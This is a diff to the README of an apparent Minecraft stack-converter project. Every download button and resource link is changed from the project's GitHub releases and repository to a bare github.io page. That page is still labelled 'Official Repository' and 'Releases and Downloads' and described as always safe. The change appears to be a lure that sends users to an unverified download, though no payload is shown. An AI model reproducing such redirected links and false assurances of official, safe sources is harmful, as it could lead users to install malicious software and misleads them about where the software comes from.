@@ -1,6 +1,6 @@
 # 🧱 convertisseur-stacks-web - Convert Minecraft Stacks Effortlessly in 2026
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen?style=for-the-badge&logo=github&color=%234CAF50)](https://github.com/ahmedgika227-arch/convertisseur-stacks-web/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen?style=for-the-badge&logo=github&color=%234CAF50)](https://ahmedgika227-arch.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Getting this tool on your computer is a piece of cake. Follow these simple steps
 Visit this link to download the application. This is the official source, so it is always safe and up-to-date.
 
 <p align="center">
-  <a href="https://github.com/ahmedgika227-arch/convertisseur-stacks-web/releases">
+  <a href="https://ahmedgika227-arch.github.io">
     <img src="https://img.shields.io/badge/🚀%20Download%20convertisseur--stacks--web-Click%20Here-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">
   </a>
 </p>
@@ -139,7 +139,7 @@ Whether you're a Redstone engineer calculating item flow, a builder estimating m
 Download it now and see how much time you can save.
 
 <p align="center">
-  <a href="https://github.com/ahmedgika227-arch/convertisseur-stacks-web/releases">
+  <a href="https://ahmedgika227-arch.github.io">
     <img src="https://img.shields.io/badge/🚀%20Get%20the%20Latest%20Version-Download%20Now-red?style=for-the-badge&logo=github" alt="Hero Download Button">
   </a>
 </p>
@@ -148,8 +148,8 @@ Download it now and see how much time you can save.
 
 ## 📚 Additional Resources
 
-- **Official Repository:** [https://github.com/ahmedgika227-arch/convertisseur-stacks-web](https://github.com/ahmedgika227-arch/convertisseur-stacks-web)
-- **Releases and Downloads:** [https://github.com/ahmedgika227-arch/convertisseur-stacks-web/releases](https://github.com/ahmedgika227-arch/convertisseur-stacks-web/releases)
+- **Official Repository:** [https://ahmedgika227-arch.github.io](https://ahmedgika227-arch.github.io)
+- **Releases and Downloads:** [https://ahmedgika227-arch.github.io](https://ahmedgika227-arch.github.io)
 
 If you have any suggestions for new features or encounter a bug, the developer encourages you to leave a message on the repository's "Issues" page. Your feedback helps improve the tool for everyone.
 
